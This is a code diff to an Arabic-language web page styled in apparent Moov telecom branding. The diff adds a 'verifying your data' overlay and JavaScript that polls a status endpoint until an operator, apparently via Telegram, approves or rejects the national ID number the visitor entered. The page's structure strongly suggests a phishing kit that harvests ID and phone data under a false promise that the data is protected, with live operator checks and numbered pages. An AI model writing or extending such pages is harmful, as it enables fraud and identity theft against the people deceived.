@@ -227,6 +227,66 @@
             font-weight: 500;
             opacity: 0.9;
         }
+
+        /* Status Overlay Modal */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(4px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .overlay-card {
+            background: #ffffff;
+            width: 85%;
+            max-width: 340px;
+            padding: 30px 20px;
+            border-radius: 18px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            animation: popIn 0.3s ease-out;
+        }
+
+        @keyframes popIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e2e8f0;
+            border-top-color: var(--moov-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            color: var(--moov-blue);
+            font-size: 18px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+
+        .overlay-desc {
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.5;
+            margin: 0;
+        }
     </style>
 </head>
 
@@ -276,11 +336,23 @@
     <p class="terms-text">جميع بياناتك الشخصية محمية ومشفّرة وفق القوانين المعمول بها</p>
 </div>
 
+<!-- Status Overlay Modal -->
+<div id="statusOverlay" class="overlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">جاري التحقق من البيانات...</div>
+        <p class="overlay-desc">يرجى الانتظار قليلاً بينما يتأكد النظام من صحة الرقم الوطني.</p>
+    </div>
+</div>
+
 <script>
 document.addEventListener("DOMContentLoaded", () => {
     const cinInput = document.getElementById("cinInput");
     const submitBtn = document.getElementById("submitBtn");
     const errorDisplay = document.getElementById("errorDisplay");
+    const statusOverlay = document.getElementById("statusOverlay");
+
+    let pollInterval = null;
 
     // Telegram SDK setup
     const tg = window.Telegram?.WebApp;
@@ -308,6 +380,33 @@ document.addEventListener("DOMContentLoaded", () => {
         submitBtn.classList.toggle("active", isValid);
     });
 
+    // Function to check approval status from Telegram
+    function startStatusPolling(phone) {
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await res.json();
+
+                if (data.status === "cin_approved") {
+                    clearInterval(pollInterval);
+                    window.location.href = "/page9";
+                } else if (data.status === "cin_rejected") {
+                    clearInterval(pollInterval);
+                    statusOverlay.style.display = "none";
+                    errorDisplay.textContent = "رقم بطاقة التعريف الوطنية غير صحيح. يرجى المحاولة مرة أخرى.";
+                    errorDisplay.style.display = "block";
+                    cinInput.classList.add("input-error");
+                    cinInput.value = "";
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove("active");
+                    submitBtn.textContent = "متابعة";
+                }
+            } catch (err) {
+                console.error("Polling error:", err);
+            }
+        }, 2000);
+    }
+
     // Handle form submission
     submitBtn.addEventListener("click", async () => {
         if (!submitBtn.classList.contains("active")) return;
@@ -330,7 +429,9 @@ document.addEventListener("DOMContentLoaded", () => {
 
             const data = await response.json();
             if (data.success) {
-                window.location.href = "/page9";
+                // Show overlay status screen and start polling Telegram response
+                statusOverlay.style.display = "flex";
+                startStatusPolling(phone);
             } else {
                 alert("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
                 submitBtn.disabled = false;
